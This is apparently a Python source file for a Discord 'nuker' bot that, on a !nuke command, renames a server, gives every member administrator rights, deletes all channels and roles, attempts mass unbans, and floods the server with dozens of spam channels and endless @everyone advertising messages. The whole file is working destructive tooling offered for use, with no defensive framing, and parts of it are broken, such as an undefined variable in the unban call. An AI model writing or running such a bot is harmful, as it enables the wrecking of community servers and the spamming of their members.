import os
import discord
import random
import json
from discord.ext import commands
from discord import Permissions
from discord.ext.commands import MissingPermissions
from pystyle import Colorate, Colors

intents = discord.Intents.all()
intents.members = True

config = r"zoloconfig.json"

with open(config, 'r') as f:
  config = json.load(f)
  server_name = config["server_name"]
  token = config["token"]


SPAM_CHANNEL = ["zolo"]
SPAM_MESSAGE = ["***@everyone JOIN TO GET THIS AMAZING NUKER*** https://discord.gg/Hqv36QvW https://www.youtube.com/channel/UCdnBjYLRGQArK9BI8KRMOqg"]

client = commands.Bot(command_prefix="!")

os.system('cls')

def _print(text):
    print(Colorate.Horizontal(Colors.blue_to_purple, text))

def banner():
  _print('''
                                                  _       
                                                 | |      
                                         _______ | | ___  
                                        |_  / _ \| |/ _ \ 
                                         / / (_) | | (_) |
                                        /___\___/|_|\___/ 

                                        Made By Zolo#7023 
                         ╔══════════════════════════════════════════════╗
                         ║               zolo discord nuker             ║
                         ║                  commands                    ║
                         ║!nuke                                         ║
                         ║starts nuking                                 ║
                         ║                                              ║
                         ║!stop                                         ║
                         ║stops nuking                                  ║
                         ╚══════════════════════════════════════════════╝                                     
''')

@client.event
async def on_ready():
  await client.change_presence(activity=discord.Streaming(name="funny here", url= "https://www.twitch.tv/Discord"))

  os.system(f'cls & mode 95,30 & title zolo nuker')
  banner() 

@client.event
async def on_command_error(ctx, error):
  if isinstance(error, MissingPermissions):
    await ctx.send("You don't have permissions to use this command")
    _print("You don't have permissions to use this command")
  else:
    await ctx.send("Wrong Command")
    _print("Wrong Command")

@client.command()
async def stop(ctx):
  await ctx.message.delete()
  msg = await ctx.send(f"Restarting '{client.user.name}'...")
  await msg.delete()
  os.system("LunaNuker.py")
  exit()

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    await guild.edit(name=server_name)
    _print(f"'{client.user.name}'server was changed to "+ server_name)
    _print(f"'{ctx.author}' ran this command.")
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      _print("I have given everyone admin.")
    except:
      _print("I was unable to give everyone admin")
    for channel in guild.channels:
      try:
        await channel.delete()
        _print(f"{channel.name} was deleted.")
      except:
        _print(f"{channel.name} was NOT deleted.")
    for role in guild.roles:
     try:
       await role.delete()
       _print(f"{role.name} Has been deleted")
     except:
       _print(f"{role.name} Has not been deleted")
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban(DiscordID)
        _print(f"{user.name}#{user.discriminator} Was successfully unbanned.")
      except:
        _print(f"{user.name}#{user.discriminator} Was not unbanned.")
    await guild.create_text_channel("zolo")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        _print(f"New Invite: {link}")
    amount = 45
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))



client.run(token, bot=True)
